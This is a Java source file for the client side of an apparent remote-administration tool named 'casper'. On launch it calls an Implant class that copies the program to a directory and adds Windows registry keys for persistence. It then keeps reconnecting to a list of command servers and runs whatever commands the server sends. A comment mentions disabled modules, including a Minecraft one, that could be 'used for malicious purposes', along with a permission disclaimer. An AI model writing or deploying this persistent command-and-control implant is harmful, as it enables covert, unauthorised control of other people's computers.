package casper.client;

import casper.client.commands.Action;
import casper.client.commands.Command;
import casper.client.commands.impl.JavaVersion;
import casper.client.misc.Implant;
import casper.net.Connection;
import casper.net.Downstream;
import casper.net.Packet;
import casper.net.Upstream;
import casper.net.json.JSONException;

import java.io.IOException;
import java.net.Socket;
import java.util.*;

/**
 * The Client is the user that will connect to the server. Technically the
 * Admin is a client, with the exception that the Admin class authenticates
 * with the server. The client class will also execute commands issued by
 * the Admin class.
 *
 * @author Aazim
 * @version 1.0
 */
public class Client implements Runnable {

    private final LinkedList<String> servers = new LinkedList<String>();
    private final Map<String, Action> handlers = new HashMap<String, Action>();
    private final Object UPSTREAM_LOCK = new Object();
    private final Packet PONG_PACKET = new Packet(Upstream.PONG.getOpcode(), 0);
    private final Queue<Packet> packetQueue = new LinkedList<Packet>();

    private boolean running = false;
    private Connection connection;
    private int opcode = -1;
    private int packetLength = -1;
    private long pingTime;
    private String uniqueHash;

    /**
     * The following handlers that are commented out are done so for the fact that they can be
     * used for malicious purposes. That is not that purpose of this project, nor do I intend it
     * to be. By removing the comments of any of the following modules, you agree that you yourself
     * have specific permission to run the various recoveries and tests on the client computer.
     */
    private static final Class<?>[] MODULES = {
            JavaVersion.class,
            //Minecraft.class /* Commented out because I can see some bad implementations... */
    };

    {
        for (Class<?> module : MODULES) {
            try {
                System.out.println("Loaded module: " + module.getAnnotation(Command.class).value() + " -> " +
                                           module.asSubclass(Action.class).newInstance().toString());
                handlers.put(module.getAnnotation(Command.class).value(),
                             module.asSubclass(Action.class).newInstance());

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) {
        List<String> servers = Arrays.asList(Configuration.servers());
        Collections.shuffle(servers);
        Client client = new Client(servers);
        client.run();
    }

    public Client(List<String> serverQueue) {
        servers.addAll(serverQueue);
    }

    @Override
    public void run() {
        uniqueHash = System.getProperty("user.name");
        Implant implant = new Implant();
        try {
            implant.addRegistryKeys(implant.copyTo(implant.getDirectory()));
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(-1);
        }
        running = true;
        while (running) {
            try {
                establishConnection();
            } catch (IOException ioe) {
                try {
                    Thread.sleep(Configuration.reconnect());
                } catch (InterruptedException ignored) {
                }
                continue;
            }
            synchronized (UPSTREAM_LOCK) {
                Packet update = new Packet(Upstream.UPDATE.getOpcode(), Upstream.UPDATE.length());
                update.writeShort(Configuration.version());
                packetQueue.add(update);
            }
            while (true) {
                try {
                    updateConnection();
                } catch (IOException ioe) {
                    ioe.printStackTrace();
                    connection.disconnect();
                    connection = null;
                    opcode = -1;
                    packetQueue.clear();
                    break;
                }
            }
        }
    }

    private void updateConnection() throws IOException {
        if (System.currentTimeMillis() - pingTime > Configuration.timeout()) {
            throw new IOException("timeout");
        }
        for (int i = 0; i < 5; i++) {
            handleUpstream();
            try {
                Thread.sleep(10);
            } catch (InterruptedException ignored) {
            }
        }
        for (int i = 0; i < 5; i++) {
            if (!handleDownstream()) {
                break;
            }
        }
    }

    private void handleUpstream() throws IOException {
        synchronized (UPSTREAM_LOCK) {
            Iterator<Packet> it = packetQueue.iterator();
            while (it.hasNext()) {
                Packet p = it.next();
                int op = p.getOpcode();
                int len = Upstream.length(op);
                int pos = p.getPosition();

                byte[] data;

                if (len > 0) {
                    data = new byte[1 + pos];
                    data[0] = (byte) op;
                    System.arraycopy(p.getBuffer(), 0, data, 1, pos);
                } else if (len == 0) {
                    data = new byte[1];
                    data[0] = (byte) op;
                } else if (len == -1) {
                    data = new byte[2 + pos];
                    data[0] = (byte) op;
                    data[1] = (byte) pos;
                    System.arraycopy(p.getBuffer(), 0, data, 2, pos);
                } else if (len == -2) {
                    data = new byte[4 + pos];
                    data[0] = (byte) op;
                    data[1] = (byte) ((pos >> 16) & 0xff);
                    data[2] = (byte) ((pos >> 8) & 0xff);
                    data[3] = (byte) (pos & 0xff);
                    System.arraycopy(p.getBuffer(), 0, data, 3, pos);
                } else {
                    throw new IllegalStateException("invalid packet length!");
                }
                connection.write(data, 0, data.length);
                it.remove();
            }
        }
    }

    private boolean handleDownstream() throws IOException {
        int available = connection.available();
        if (available == 0) {
            return false;
        }

        if (opcode == -1) {
            opcode = connection.read() & 0xff;
            packetLength = Downstream.length(opcode);
            --available;
        }

        if (packetLength == -1) {
            if (available > 0) {
                packetLength = connection.read() & 0xff;
                --available;
            } else {
                return false;
            }
        } else if (packetLength == -2) {
            if (available > 2) {
                packetLength = ((connection.read() & 0xff) << 16) | ((connection.read() & 0xff) << 8) | (connection.read() & 0xff);
                available -= 3;
            } else {
                return false;
            }
        }

        if (available < packetLength) {
            return false;
        }

        Packet packet = new Packet(opcode, packetLength);
        if (packetLength > 0) {
            connection.read(0, packetLength, packet.getBuffer());
        }

        if (opcode == Downstream.PING.getOpcode()) {
            pingTime = System.currentTimeMillis();
            synchronized (UPSTREAM_LOCK) {
                packetQueue.add(PONG_PACKET);
            }
        } else if (opcode == Downstream.UPDATE.getOpcode()) {
            //TODO: Make an update method.
            stop();
        } else if (opcode == Downstream.COMMAND.getOpcode()) {
            String command = packet.readCString();
            System.out.println("Read command is: " + command);
            Action c = handlers.get(command);
            if (c != null) {
                try {
                    c.execute(this, packet);
                } catch (JSONException ignored) {
                    ignored.printStackTrace();
                }
            } else {
                System.out.println("[CLIENT] uop " + opcode);
            }
        }

        opcode = -1;
        return true;
    }

    public void stop() {
        running = false;
        connection.disconnect();
    }

    public void print(String msg) {
        Packet packet = new Packet(Upstream.MESSAGE.getOpcode(), msg.length() + 1);
        packet.writeCString(msg);
        System.out.println("[CLIENT] -> " + msg + " | " + packet);
        packetQueue.add(packet);
    }

    private void establishConnection() throws IOException {
        if (connection == null) {
            String server = servers.poll();
            servers.add(server);
            String[] tokens = server.split(":");
            connection = new Connection(new Socket(tokens[0], Integer.parseInt(tokens[1])));
            pingTime = System.currentTimeMillis();
        }
    }
}
